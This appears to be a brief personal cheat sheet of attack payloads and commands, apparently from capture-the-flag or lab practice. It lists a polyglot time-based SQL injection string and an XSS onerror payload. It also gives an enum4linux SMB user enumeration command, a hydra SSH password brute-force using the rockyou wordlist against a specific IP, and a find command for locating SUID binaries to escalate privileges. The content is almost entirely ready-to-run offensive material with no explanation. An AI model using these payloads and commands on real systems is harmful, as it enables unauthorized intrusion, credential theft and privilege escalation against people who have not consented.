# payload
 ## SQLi one for all
    
    SLEEP(10)+/*'+or+SLEEP(10)+or'"+or+SLEEP(10)+or+"*/
 ## XSS
 
    "><img src=dwqdwq onerror=console.log(1)>

    
# SystemPrivilege


 **smb find username ,password**
 
 >./enum4linux.pl -a <IP> to get username
 
 **check rockyou to get password ssh with hydra**
 
 >hydra -l jan -P /home/madridista/wordlists/rockyou.txt 10.10.131.125 ssh
 
 

 **find SUID**
 
 >find / -user root -perm -4000 -exec ls -ldb {} \;

 

